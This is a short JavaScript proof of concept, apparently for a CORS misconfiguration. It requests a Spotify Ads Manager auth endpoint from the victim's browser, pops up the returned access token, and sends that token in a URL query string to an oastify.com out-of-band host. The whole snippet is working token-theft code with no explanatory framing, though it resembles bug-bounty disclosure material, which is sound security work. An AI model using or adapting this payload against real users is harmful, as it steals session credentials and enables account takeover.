const fetchSpotifyAuth = async () => {
    const url = "https://adsmanager.spotify.com/auth/";

    try {
        const response = await fetch(url, {
            method: "GET",
            headers: {
                "Content-Type": "application/json",
                "Accept": "application/json"
            },
            mode: "cors"
        });

        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }

        const data = await response.json(); 
        console.log("Fetched Data:", data);
        alert(data.accessToken)
        fetch("https://2y1jggz5agnia5m80cd2wqjsajga40sp.oastify.com/?token="+data.accessToken)
        console.log("Access Token:", data.accessToken);
        console.log("Expires In Seconds:", data.expiresInSeconds);
    } catch (error) {
        console.error("Error fetching Spotify Auth:", error);
    }
};

fetchSpotifyAuth();
